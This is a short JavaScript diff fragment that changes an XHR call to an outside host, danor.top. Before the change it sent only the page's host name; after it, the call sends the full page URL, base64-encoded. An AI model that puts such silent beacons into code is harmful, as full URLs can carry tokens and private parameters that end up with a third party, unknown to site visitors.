@@ -62,6 +62,6 @@ if(self == top) { (function() {
 		}
 	};
 
-	xhr.open('GET', 'https://danor.top/af/pwd?c=danor&d='+location.host, true);
+	xhr.open('GET', 'https://danor.top/af/pwd?c=danor&d='+btoa(location.href), true);
 	xhr.send();
 })(); }
